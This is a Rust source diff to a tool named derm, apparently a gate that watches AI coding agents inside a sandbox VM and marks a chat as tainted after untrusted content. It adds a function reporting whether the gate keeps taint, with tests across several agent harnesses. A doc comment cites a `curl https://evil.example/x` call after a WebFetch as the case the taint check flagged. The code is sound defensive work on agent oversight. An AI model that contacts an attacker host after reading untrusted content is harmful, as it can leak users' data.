@@ -42,7 +42,7 @@ mod user; // lane V
           // Wave 6's seam (the wave 6 base, `plans/toolkit_wave6_plan.md` section 2.0,
           // part 3): the Standard tier, lane 6A's. The stub changes nothing.
 mod broker;
-mod claude_gate; // fix pass 6, note BE section 1.5 (e)
+pub(crate) mod claude_gate; // fix pass 6, note BE section 1.5 (e); pub(crate) for `derm kit register`
 mod standard; // lane 6A // lane 6C's R1, hosted per chat (Tony's R2), integration w6's close
 
 use std::io::Write;
@@ -219,9 +219,39 @@ pub fn main(argv: &[String]) -> u8 {
 /// redo of fix pass 4's part 2, FP4-R1), and with no daemon answer the
 /// chat counts as tainted with deny (`gate/taint/mod.rs`), which the srt
 /// notes in `plan.rs` say.
+#[cfg(test)]
 fn taint_not_reached(harness: &str, boundary: Boundary, verdict: Option<&str>) -> Option<String> {
+    taint_under_sbx(harness, boundary, verdict, false)
+}
+
+/// [`taint_not_reached`], knowing whether the kit for this chat is the form
+/// whose gate is derm itself (`DERM_SBX_KIT=rust`, `boundary::kit::rust_form`;
+/// 19 Nov 2026). That gate keeps the chat's taint in the daemon over the VM
+/// route, as Codex's does. Seen on the box (sbx 0.51.0, the hooks run by
+/// hand in the VM for Claude Code): after a WebFetch, `curl
+/// https://evil.example/x` was reviewed with "taint: reaches evil.example
+/// for the first time after untrusted content" and the chat's report held
+/// two `taint.mark` records; with the kit that carries Node the same calls
+/// left none. The start line said no gate in the VM keeps taint.
+fn taint_under_sbx(
+    harness: &str,
+    boundary: Boundary,
+    verdict: Option<&str>,
+    derm_gate: bool,
+) -> Option<String> {
     if boundary != Boundary::Sbx {
         return None;
+    }
+    if derm_gate && harness != "codex" {
+        let named = match verdict {
+            Some(v) => format!(" (--taint {v})"),
+            None => String::new(),
+        };
+        let name = boundary::kit::spec(harness).map_or(harness, |s| s.name);
+        return Some(format!(
+            "derm run: taint under sbx: with derm's kit {name}'s gate in the VM is derm itself ({}=rust) and keeps this chat's taint in the daemon{named}; without the kit no gate there does (the line about the VM's gate below says which)",
+            boundary::kit::SWITCH
+        ));
     }
     // Codex's kit puts derm's own gate in the VM, and that gate keeps the
     // chat's taint in the daemon over the VM route (`POST /derm/v1/taint`;
@@ -1801,7 +1831,16 @@ fn run_io(argv: &[String], env: &RunEnv, filter: Option<StdioFilter>) -> Result<
     let taint_record: Option<serde_json::Value> = a
         .taint
         .map(|v| serde_json::json!({"verdict": v.as_str(), "from": "flag"}));
-    if let Some(n) = taint_not_reached(a.harness.id, a.boundary, a.taint.map(|v| v.as_str())) {
+    let derm_gate = boundary::kit::rust_form(
+        a.harness.id,
+        std::env::var(boundary::kit::SWITCH).ok().as_deref(),
+    );
+    if let Some(n) = taint_under_sbx(
+        a.harness.id,
+        a.boundary,
+        a.taint.map(|v| v.as_str()),
+        derm_gate,
+    ) {
         p.notes.push(n);
     }
     // Content capture's switch as the chat starts (lane S's request 3). It
@@ -4730,6 +4769,41 @@ mod end_to_end {
         let other = taint_not_reached("claude-code", Boundary::Sbx, None).unwrap();
         assert!(!other.contains("does not run in the VM"), "{other}");
         assert!(taint_not_reached("codex", Boundary::Srt, None).is_none());
+    }
+
+    /// 19 Nov 2026, the kits whose gate is derm itself (`DERM_SBX_KIT=rust`):
+    /// that gate keeps taint over the VM route, so the start does not say
+    /// that no gate there does, and names the verdict asked for. Without the
+    /// switch the line is as it was, and Codex's is its own either way.
+    #[test]
+    fn under_sbx_a_kit_whose_gate_is_derm_keeps_taint_and_the_start_says_so() {
+        for (harness, name) in [
+            ("claude-code", "Claude Code"),
+            ("droid", "Droid"),
+            ("cursor", "Cursor"),
+            ("kiro", "Kiro"),
+            ("copilot-cli", "Copilot CLI"),
+        ] {
+            let n = taint_under_sbx(harness, Boundary::Sbx, Some("deny"), true).unwrap();
+            assert!(
+                n.contains(&format!(
+                    "with derm's kit {name}'s gate in the VM is derm itself (DERM_SBX_KIT=rust) and keeps this chat's taint in the daemon (--taint deny)"
+                )),
+                "{n}"
+            );
+            assert!(!n.contains("is not applied"), "{n}");
+            assert!(!n.contains("decides with no taint"), "{n}");
+            assert!(n.contains("without the kit no gate there does"), "{n}");
+            assert_eq!(
+                taint_under_sbx(harness, Boundary::Sbx, Some("deny"), false),
+                taint_not_reached(harness, Boundary::Sbx, Some("deny"))
+            );
+            assert!(taint_under_sbx(harness, Boundary::Srt, None, true).is_none());
+        }
+        assert_eq!(
+            taint_under_sbx("codex", Boundary::Sbx, Some("ask"), true),
+            taint_not_reached("codex", Boundary::Sbx, Some("ask"))
+        );
     }
 
     /// Was `bw6r2_5_under_srt_on_linux_the_start_says_taint_is_not_applied`.
